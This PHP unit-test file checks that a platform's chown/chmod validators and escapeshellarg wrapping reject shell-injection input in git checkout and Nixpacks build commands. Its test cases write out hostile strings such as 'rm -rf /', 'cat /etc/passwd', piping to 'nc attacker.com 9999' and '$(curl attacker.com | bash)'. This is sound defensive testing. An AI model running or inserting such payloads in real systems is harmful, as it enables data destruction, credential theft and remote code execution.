<?php

/**
 * Command Injection Prevention Tests
 *
 * Verifies that security fixes applied to Saturn Platform correctly reject
 * malicious input in chown/chmod fields and git checkout / Nixpacks commands.
 *
 * Covered areas:
 *  1. LocalFileVolume chown validation  — regex `/^[a-zA-Z0-9_.\-]+(:[a-zA-Z0-9_.\-]+)?$/`
 *  2. LocalFileVolume chmod validation  — regex `/^[0-7]{3,4}$/`
 *  3. Application::buildGitCheckoutCommand — uses escapeshellarg($target)
 *  4. Nixpacks build_command escaping    — uses escapeshellarg($build_command)
 *
 * These are pure-logic unit tests; no database is required.
 *
 * Related Files:
 *  - app/Models/LocalFileVolume.php (saveStorageOnServer)
 *  - app/Models/Application.php (buildGitCheckoutCommand)
 *  - app/Traits/Deployment/HandlesNixpacksBuildpack.php (nixpacks_build_cmd)
 */

// ---------------------------------------------------------------------------
// Helpers that mirror the production validation logic without touching the DB
// ---------------------------------------------------------------------------

/**
 * Replicates the chown validation block from LocalFileVolume::saveStorageOnServer().
 *
 * @throws \Exception when the value does not match the allowlist pattern
 */
function validateChown(string $chown): void
{
    if (! preg_match('/^[a-zA-Z0-9_.\-]+(:[a-zA-Z0-9_.\-]+)?$/', $chown)) {
        throw new \Exception('Invalid chown value: only alphanumeric, dash, dot, underscore and colon are allowed.');
    }
}

/**
 * Replicates the chmod validation block from LocalFileVolume::saveStorageOnServer().
 *
 * @throws \Exception when the value does not match the octal allowlist pattern
 */
function validateChmod(string $chmod): void
{
    if (! preg_match('/^[0-7]{3,4}$/', $chmod)) {
        throw new \Exception('Invalid chmod value: only octal notation (e.g. 644, 0755) is allowed.');
    }
}

/**
 * Replicates Application::buildGitCheckoutCommand() without the model/settings dependency.
 * The method is protected, so we reproduce just the escaping portion for unit testing.
 */
function buildGitCheckoutCommand(string $target, bool $submodulesEnabled = false): string
{
    $escapedTarget = escapeshellarg($target);
    $command = "git checkout {$escapedTarget}";

    if ($submodulesEnabled) {
        $command .= ' && git submodule update --init --recursive';
    }

    return $command;
}

/**
 * Replicates the Nixpacks build_command escaping from HandlesNixpacksBuildpack::nixpacks_build_cmd().
 */
function buildNixpacksCommand(string $buildCommand, string $workdir = '/app'): string
{
    $nixpacks_command = 'nixpacks plan -f json';
    $nixpacks_command .= ' --build-cmd '.escapeshellarg($buildCommand);
    $nixpacks_command .= " {$workdir}";

    return $nixpacks_command;
}

// ---------------------------------------------------------------------------
// 1. LocalFileVolume — chown validation
// ---------------------------------------------------------------------------

describe('LocalFileVolume chown validation', function () {

    // --- valid values ---

    it('accepts simple username like root', function () {
        expect(fn () => validateChown('root'))->not->toThrow(\Exception::class);
    });

    it('accepts user:group pair like www-data:www-data', function () {
        expect(fn () => validateChown('www-data:www-data'))->not->toThrow(\Exception::class);
    });

    it('accepts numeric uid:gid pair like 1000:1000', function () {
        expect(fn () => validateChown('1000:1000'))->not->toThrow(\Exception::class);
    });

    it('accepts uid only like 1000', function () {
        expect(fn () => validateChown('1000'))->not->toThrow(\Exception::class);
    });

    it('accepts username with dot like nobody', function () {
        expect(fn () => validateChown('nobody'))->not->toThrow(\Exception::class);
    });

    it('accepts username with underscore like _daemon', function () {
        expect(fn () => validateChown('_daemon'))->not->toThrow(\Exception::class);
    });

    it('accepts username with hyphen like www-data', function () {
        expect(fn () => validateChown('www-data'))->not->toThrow(\Exception::class);
    });

    it('accepts user:group with dots like mysql.mysql', function () {
        expect(fn () => validateChown('mysql.mysql'))->not->toThrow(\Exception::class);
    });

    // --- invalid / malicious values ---

    it('rejects semicolon injection like root; rm -rf /', function () {
        expect(fn () => validateChown('root; rm -rf /'))->toThrow(\Exception::class);
    });

    it('rejects command substitution via $() like $(whoami)', function () {
        expect(fn () => validateChown('$(whoami)'))->toThrow(\Exception::class);
    });

    it('rejects AND chaining like root && cat /etc/passwd', function () {
        expect(fn () => validateChown('root && cat /etc/passwd'))->toThrow(\Exception::class);
    });

    it('rejects backtick command substitution like `id`', function () {
        expect(fn () => validateChown('root`id`'))->toThrow(\Exception::class);
    });

    it('rejects pipe injection like root | nc attacker.com 9999', function () {
        expect(fn () => validateChown('root | nc attacker.com 9999'))->toThrow(\Exception::class);
    });

    it('rejects value with spaces like root root', function () {
        expect(fn () => validateChown('root root'))->toThrow(\Exception::class);
    });

    it('rejects value with newline character', function () {
        expect(fn () => validateChown("root\nwhoami"))->toThrow(\Exception::class);
    });

    it('rejects value with slash like /etc/passwd', function () {
        expect(fn () => validateChown('/etc/passwd'))->toThrow(\Exception::class);
    });

    it('rejects double colon like root::0', function () {
        // Regex only allows one colon-separated segment; double colon fails the pattern
        expect(fn () => validateChown('root::0'))->toThrow(\Exception::class);
    });

    it('rejects empty string', function () {
        // Empty string does not match /^[a-zA-Z0-9_.\-]+.../
        expect(fn () => validateChown(''))->toThrow(\Exception::class);
    });
});

// ---------------------------------------------------------------------------
// 2. LocalFileVolume — chmod validation
// ---------------------------------------------------------------------------

describe('LocalFileVolume chmod validation', function () {

    // --- valid values ---

    it('accepts 3-digit octal 644', function () {
        expect(fn () => validateChmod('644'))->not->toThrow(\Exception::class);
    });

    it('accepts 4-digit octal 0755 with leading zero', function () {
        expect(fn () => validateChmod('0755'))->not->toThrow(\Exception::class);
    });

    it('accepts 777', function () {
        expect(fn () => validateChmod('777'))->not->toThrow(\Exception::class);
    });

    it('accepts 000 (no permissions)', function () {
        expect(fn () => validateChmod('000'))->not->toThrow(\Exception::class);
    });

    it('accepts 4755 (setuid bit)', function () {
        expect(fn () => validateChmod('4755'))->not->toThrow(\Exception::class);
    });

    it('accepts 0600', function () {
        expect(fn () => validateChmod('0600'))->not->toThrow(\Exception::class);
    });

    // --- invalid / malicious values ---

    it('rejects digit 8 which is not octal like 999', function () {
        expect(fn () => validateChmod('999'))->toThrow(\Exception::class);
    });

    it('rejects digit 9 which is not octal like 888', function () {
        expect(fn () => validateChmod('888'))->toThrow(\Exception::class);
    });

    it('rejects alphabetic value like abc', function () {
        expect(fn () => validateChmod('abc'))->toThrow(\Exception::class);
    });

    it('rejects symbolic notation like +x', function () {
        expect(fn () => validateChmod('+x'))->toThrow(\Exception::class);
    });

    it('rejects injection via semicolon like 777; rm -rf /', function () {
        expect(fn () => validateChmod('777; rm -rf /'))->toThrow(\Exception::class);
    });

    it('rejects command substitution via $() like $(id)', function () {
        expect(fn () => validateChmod('$(id)'))->toThrow(\Exception::class);
    });

    it('rejects value with spaces like 7 7 7', function () {
        expect(fn () => validateChmod('7 7 7'))->toThrow(\Exception::class);
    });

    it('rejects 2-digit value because it is too short', function () {
        expect(fn () => validateChmod('77'))->toThrow(\Exception::class);
    });

    it('rejects 5-digit value because it is too long', function () {
        expect(fn () => validateChmod('07777'))->toThrow(\Exception::class);
    });

    it('rejects empty string', function () {
        expect(fn () => validateChmod(''))->toThrow(\Exception::class);
    });
});

// ---------------------------------------------------------------------------
// 3. Application::buildGitCheckoutCommand — escapeshellarg wrapping
// ---------------------------------------------------------------------------

describe('Application buildGitCheckoutCommand escaping', function () {

    it('produces a git checkout command for a simple branch name', function () {
        $command = buildGitCheckoutCommand('main');
        expect($command)->toBe("git checkout 'main'");
    });

    it('wraps the target in single quotes via escapeshellarg', function () {
        $command = buildGitCheckoutCommand('feature/my-branch');
        // escapeshellarg wraps with single quotes on Linux/Mac
        expect($command)->toStartWith('git checkout ');
        expect($command)->toContain(escapeshellarg('feature/my-branch'));
    });

    it('escapes semicolon so it cannot act as a command separator', function () {
        $maliciousTarget = 'main; rm -rf /';
        $command = buildGitCheckoutCommand($maliciousTarget);
        $escaped = escapeshellarg($maliciousTarget);

        // The whole argument must be wrapped exactly as escapeshellarg produces
        expect($command)->toBe("git checkout {$escaped}");
        // Security guarantee: the escaped argument is a single-quoted token.
        // The semicolon is neutralised because it sits inside single quotes.
        // Verify the command matches the pattern: git checkout '<anything>'
        expect($command)->toMatch("/^git checkout '.*'$/s");
        // The dangerous characters exist only inside the single-quoted argument —
        // there must be no unquoted semicolon OUTSIDE the single-quoted region
        $afterCheckout = substr($command, strlen('git checkout '));
        expect($afterCheckout)->toStartWith("'");
        expect($afterCheckout)->toEndWith("'");
    });

    it('escapes double-ampersand chaining attempt', function () {
        $maliciousTarget = 'main && cat /etc/passwd';
        $command = buildGitCheckoutCommand($maliciousTarget);
        $escaped = escapeshellarg($maliciousTarget);

        expect($command)->toBe("git checkout {$escaped}");
        // The entire argument after "git checkout " is a single-quoted shell token
        $afterCheckout = substr($command, strlen('git checkout '));
        expect($afterCheckout)->toStartWith("'");
        expect($afterCheckout)->toEndWith("'");
    });

    it('escapes pipe injection attempt', function () {
        $maliciousTarget = 'main | curl attacker.com';
        $command = buildGitCheckoutCommand($maliciousTarget);
        $escaped = escapeshellarg($maliciousTarget);

        expect($command)->toBe("git checkout {$escaped}");
        // Entire argument is a single-quoted token — pipe cannot create a new process
        $afterCheckout = substr($command, strlen('git checkout '));
        expect($afterCheckout)->toStartWith("'");
        expect($afterCheckout)->toEndWith("'");
    });

    it('escapes command substitution via $()', function () {
        $maliciousTarget = '$(curl attacker.com | bash)';
        $command = buildGitCheckoutCommand($maliciousTarget);
        $escaped = escapeshellarg($maliciousTarget);

        expect($command)->toBe("git checkout {$escaped}");
        // The $( sequence must not be executable — the whole string is single-quoted
        expect($command)->not->toMatch('/git checkout \$\(/');
    });

    it('escapes backtick command substitution', function () {
        $maliciousTarget = '`whoami`';
        $command = buildGitCheckoutCommand($maliciousTarget);
        $escaped = escapeshellarg($maliciousTarget);

        expect($command)->toBe("git checkout {$escaped}");
    });

    it('handles a commit SHA safely', function () {
        $sha = 'abc1234def5678';
        $command = buildGitCheckoutCommand($sha);

        expect($command)->toContain(escapeshellarg($sha));
        expect($command)->toBe("git checkout 'abc1234def5678'");
    });

    it('appends submodule update when submodules are enabled', function () {
        $command = buildGitCheckoutCommand('main', submodulesEnabled: true);

        expect($command)->toContain('git checkout');
        expect($command)->toContain('git submodule update --init --recursive');
    });

    it('does not append submodule update when submodules are disabled', function () {
        $command = buildGitCheckoutCommand('main', submodulesEnabled: false);

        expect($command)->not->toContain('git submodule');
    });

    it('submodule update is still appended even with malicious target', function () {
        $maliciousTarget = 'main; curl evil.com';
        $command = buildGitCheckoutCommand($maliciousTarget, submodulesEnabled: true);

        // The malicious segment is quoted, then the safe submodule command follows
        expect($command)->toContain(escapeshellarg($maliciousTarget));
        expect($command)->toContain('&& git submodule update --init --recursive');
        // The raw injection must not appear unquoted
        expect($command)->not->toContain('; curl evil.com &&');
    });
});

// ---------------------------------------------------------------------------
// 4. Nixpacks build_command escaping
// ---------------------------------------------------------------------------

describe('Nixpacks build_command escaping', function () {

    it('wraps a simple npm run build command with escapeshellarg', function () {
        $command = buildNixpacksCommand('npm run build');
        $expected = escapeshellarg('npm run build');

        expect($command)->toContain("--build-cmd {$expected}");
    });

    it('escapes semicolon injection in build_command', function () {
        $malicious = 'npm run build; curl attacker.com | bash';
        $command = buildNixpacksCommand($malicious);
        $escaped = escapeshellarg($malicious);

        // The argument passed to --build-cmd must match exactly what escapeshellarg produces
        expect($command)->toContain("--build-cmd {$escaped}");
        // Security guarantee: escapeshellarg wraps the entire value in single quotes,
        // making every shell metacharacter inside it a literal character.
        // On Linux/macOS escapeshellarg always returns a single-quoted string.
        expect($escaped)->toStartWith("'");
        expect($escaped)->toEndWith("'");
    });

    it('escapes double-ampersand chaining in build_command', function () {
        $malicious = 'npm run build && rm -rf /';
        $command = buildNixpacksCommand($malicious);
        $escaped = escapeshellarg($malicious);

        expect($command)->toContain("--build-cmd {$escaped}");
        // The && operator is enclosed inside single quotes and cannot chain commands
        expect($escaped)->toStartWith("'");
        expect($escaped)->toEndWith("'");
    });

    it('escapes pipe operator in build_command', function () {
        $malicious = 'npm run build | nc attacker.com 9999';
        $command = buildNixpacksCommand($malicious);
        $escaped = escapeshellarg($malicious);

        expect($command)->toContain("--build-cmd {$escaped}");
        // The pipe character is contained inside single quotes — inert to the shell
        expect($escaped)->toStartWith("'");
        expect($escaped)->toEndWith("'");
    });

    it('escapes command substitution via $() in build_command', function () {
        $malicious = 'npm run build $(curl evil.com)';
        $command = buildNixpacksCommand($malicious);
        $escaped = escapeshellarg($malicious);

        expect($command)->toContain("--build-cmd {$escaped}");
        // Unquoted $( must not appear
        expect($command)->not->toMatch('/--build-cmd\s+\$\(/');
    });

    it('escapes backtick command substitution in build_command', function () {
        $malicious = 'npm run build `id`';
        $command = buildNixpacksCommand($malicious);
        $escaped = escapeshellarg($malicious);

        expect($command)->toContain("--build-cmd {$escaped}");
    });

    it('preserves legitimate multi-step build command with escapeshellarg', function () {
        // A real-world build command with legitimate logical OR
        $legitimateCmd = 'yarn build';
        $command = buildNixpacksCommand($legitimateCmd);
        $escaped = escapeshellarg($legitimateCmd);

        expect($command)->toContain("--build-cmd {$escaped}");
        expect($command)->toContain('nixpacks plan -f json');
    });

    it('command ends with workdir after the escaped build-cmd', function () {
        $workdir = '/data/app';
        $command = buildNixpacksCommand('npm run build', $workdir);

        expect($command)->toEndWith(" {$workdir}");
    });

    it('produced command contains the full nixpacks plan prefix', function () {
        $command = buildNixpacksCommand('make build');

        expect($command)->toStartWith('nixpacks plan -f json');
    });
});
